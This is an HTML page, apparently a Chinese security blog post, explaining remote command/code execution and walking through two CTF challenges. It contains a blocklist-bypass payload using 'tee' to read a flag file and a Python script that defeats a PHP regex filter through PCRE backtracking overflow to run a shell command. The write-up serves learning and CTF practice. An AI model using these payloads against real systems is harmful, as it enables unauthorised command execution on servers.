@@ -1,0 +1,185 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>rce | De1Aur0'Blog</title><meta name="author" content="De1Aur0"><meta name="copyright" content="De1Aur0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RCE(远程代码执行漏洞)原理及漏洞利用作用rce漏洞，可以让攻击者直接让服务器后台执行操作命令，远程操控后台 原理一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rce">
+<meta property="og:url" content="http://example.com/2023/03/31/%E5%88%9D%E8%AF%86rce/index.html">
+<meta property="og:site_name" content="De1Aur0&#39;Blog">
+<meta property="og:description" content="RCE(远程代码执行漏洞)原理及漏洞利用作用rce漏洞，可以让攻击者直接让服务器后台执行操作命令，远程操控后台 原理一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tse1-mm.cn.bing.net/th/id/OIP-C.Sl0CKQQpBxWoOub28c2N-wHaE8?w=281&h=187&c=7&r=0&o=5&dpr=1.5&pid=1.7">
+<meta property="article:published_time" content="2023-03-31T03:52:06.000Z">
+<meta property="article:modified_time" content="2023-04-25T12:37:04.449Z">
+<meta property="article:author" content="De1Aur0">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tse1-mm.cn.bing.net/th/id/OIP-C.Sl0CKQQpBxWoOub28c2N-wHaE8?w=281&h=187&c=7&r=0&o=5&dpr=1.5&pid=1.7"><link rel="shortcut icon" href="/cover/2.ico"><link rel="canonical" href="http://example.com/2023/03/31/%E5%88%9D%E8%AF%86rce/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'rce',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-25 20:37:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic2.zhimg.com/80/v2-523c835e745b2473a3a1804e12337935_720w.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tse1-mm.cn.bing.net/th/id/OIP-C.Sl0CKQQpBxWoOub28c2N-wHaE8?w=281&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.5&amp;pid=1.7')"><nav id="nav"><span id="blog-info"><a href="/" title="De1Aur0'Blog"><span class="site-name">De1Aur0'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">rce</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-31T03:52:06.000Z" title="发表于 2023-03-31 11:52:06">2023-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-25T12:37:04.449Z" title="更新于 2023-04-25 20:37:04">2023-04-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="rce"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="RCE-远程代码执行漏洞-原理及漏洞利用"><a href="#RCE-远程代码执行漏洞-原理及漏洞利用" class="headerlink" title="RCE(远程代码执行漏洞)原理及漏洞利用"></a>RCE(远程代码执行漏洞)原理及漏洞利用</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>rce漏洞，可以让攻击者直接让服务器后台执行操作命令，远程操控后台</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。<br> 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。<br>  因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
+<h2 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
+<h1 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h1><p>命令执行无回显rce思路：</p>
+<p>1.利用dnslog带外</p>
+<p>2.写马</p>
+<p>3.反弹shell</p>
+<h2 id="4-写文件然后访问文件"><a href="#4-写文件然后访问文件" class="headerlink" title="4.写文件然后访问文件"></a>4.写文件然后访问文件</h2><p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[&#x27;url&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Sorry,you can&#x27;t use this.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Can you see anything?&quot;;</span><br><span class="line">        exec($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到的是没有过滤|这个符号且符号&gt;也被过滤了，然后exec执行是没有回显的<br>这是需要用到“tee”命令  tee“将想要执行的命令写入到一个文件里面，然后再去访问这个文件，以此来执行这个命令。<br>格式传入 command | tee file.txt</p>
+<img src="/2023/03/31/%E5%88%9D%E8%AF%86rce/1.png" class="">
+<p>&#96;?url&#x3D;l\s &#x2F; | tee 1.txt 之后访问我们传入的文件1.txt</p>
+<img src="/2023/03/31/%E5%88%9D%E8%AF%86rce/2.png" class="">
+<p>找到ffffflllllgggg,<br>tac是没有被过滤的。再传入 &#96;?url&#x3D;tac &#x2F;flllll\aaaaaaggggggg | tee 2.txt<br>然后访问2.txts</p>
+<h1 id="pcre绕过"><a href="#pcre绕过" class="headerlink" title="pcre绕过"></a>pcre绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><img src="/2023/03/31/%E5%88%9D%E8%AF%86rce/3.png" class="">
+<p>那么如果找不到会一直回溯寻找嘛？当然不会 PHP有个100w的次数限制，也就是当回溯100w次 preg_match 将不在寻找，返回为false<br>注意 这里是false 0 √ false&#x3D;0 ×</p>
+<p>在本题中 当我们构造一个大于回溯个数的串造成逃逸<br>这里是json解码之后的cmd内容，我们直接构造一个json串 python发送请求<br>在尝试过程 system啥的被禁 我们可以闭合前一个 构造下一个php标签绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1.14.71.254:28997/&quot;</span></span><br><span class="line"><span class="comment"># 直接构造json串</span></span><br><span class="line">data=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;;&quot;,&quot;overflow&quot;:&quot;&#x27;</span>+<span class="string">&quot;-&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">resp = requests.post(url=url,data=&#123;<span class="string">&quot;letter&quot;</span>:data&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
+<p>注意细节：<br>这样是不对的：’{“cmd”:”?&gt;<?= `ls`?>;”,”overflow”:’+”-“*1000000+’}’<br>因为：”overflow”:’+”-“*1000000+’}’ 这里拼接完成后 - 并没有引号包裹 导致错误<br>正确的应该给外层-加上引号 如’{“cmd”:”?&gt;<?= `ls`?>;”,”overflow”:”‘+”-“*1000000+’”}’<br>因为-没有在正则的[]里面 所以可以使用</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">De1Aur0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/31/%E5%88%9D%E8%AF%86rce/">http://example.com/2023/03/31/%E5%88%9D%E8%AF%86rce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">De1Aur0'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/rce/">rce</a></div><div class="post_share"><div class="social-share" data-image="https://tse1-mm.cn.bing.net/th/id/OIP-C.Sl0CKQQpBxWoOub28c2N-wHaE8?w=281&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.5&amp;pid=1.7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/06/unserialize/" title="unserialize"><img class="cover" src="https://tse1-mm.cn.bing.net/th/id/OIP-C.i1oG6DGuWAYRDrQkpvRZyQHaE7?w=253&amp;h=180&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.5&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">unserialize</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/29/easyphp/" title="easyphp"><img class="cover" src="https://i.hexuexiao.cn/up/e5/3c/41/76b97440653fc4f227c2e57eab413ce5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">easyphp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic2.zhimg.com/80/v2-523c835e745b2473a3a1804e12337935_720w.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">De1Aur0</div><div class="author-info__description">Don't assume there's Null ahead just because of a thin mist</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/valuesleep" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:859545241@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">RCE(远程代码执行漏洞)原理及漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">系统命令执行函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BErce"><span class="toc-number">2.</span> <span class="toc-text">无回显rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%86%99%E6%96%87%E4%BB%B6%E7%84%B6%E5%90%8E%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">4.写文件然后访问文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pcre%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">pcre绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text"></span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/23/%E5%8A%AB%E6%8C%81LD-PRELOAD/" title="劫持LD_PRELOAD"><img src="https://img0.baidu.com/it/u=530637055,4152035669&amp;fm=253&amp;fmt=auto?w=800&amp;h=800" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持LD_PRELOAD"/></a><div class="content"><a class="title" href="/2023/11/23/%E5%8A%AB%E6%8C%81LD-PRELOAD/" title="劫持LD_PRELOAD">劫持LD_PRELOAD</a><time datetime="2023-11-23T10:31:25.000Z" title="发表于 2023-11-23 18:31:25">2023-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/24/Final/" title="KPCTF Final"><img src="https://www.pexels.com/zh-cn/photo/1809644/" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="KPCTF Final"/></a><div class="content"><a class="title" href="/2023/09/24/Final/" title="KPCTF Final">KPCTF Final</a><time datetime="2023-09-24T06:51:42.000Z" title="发表于 2023-09-24 14:51:42">2023-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/20/kunpengCTF2023/" title="kunpengCTF2023"><img src="https://www.pexels.com/zh-cn/photo/1809644/" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kunpengCTF2023"/></a><div class="content"><a class="title" href="/2023/09/20/kunpengCTF2023/" title="kunpengCTF2023">kunpengCTF2023</a><time datetime="2023-09-20T15:37:25.000Z" title="发表于 2023-09-20 23:37:25">2023-09-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/17/%E8%B0%B7%E6%AD%8C%E9%BB%91%E5%AE%A2%E8%AF%AD%E6%B3%95%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE/" title="谷歌黑客语法与漏洞寻找"><img src="https://www.pexels.com/zh-cn/photo/1809644/" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="谷歌黑客语法与漏洞寻找"/></a><div class="content"><a class="title" href="/2023/07/17/%E8%B0%B7%E6%AD%8C%E9%BB%91%E5%AE%A2%E8%AF%AD%E6%B3%95%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE/" title="谷歌黑客语法与漏洞寻找">谷歌黑客语法与漏洞寻找</a><time datetime="2023-07-17T06:38:11.000Z" title="发表于 2023-07-17 14:38:11">2023-07-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/15/DVWA%E9%9D%B6%E5%9C%BA/" title="DVWA靶场"><img src="https://www.pexels.com/zh-cn/photo/1809644/" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DVWA靶场"/></a><div class="content"><a class="title" href="/2023/05/15/DVWA%E9%9D%B6%E5%9C%BA/" title="DVWA靶场">DVWA靶场</a><time datetime="2023-05-15T15:24:22.000Z" title="发表于 2023-05-15 23:24:22">2023-05-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By De1Aur0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
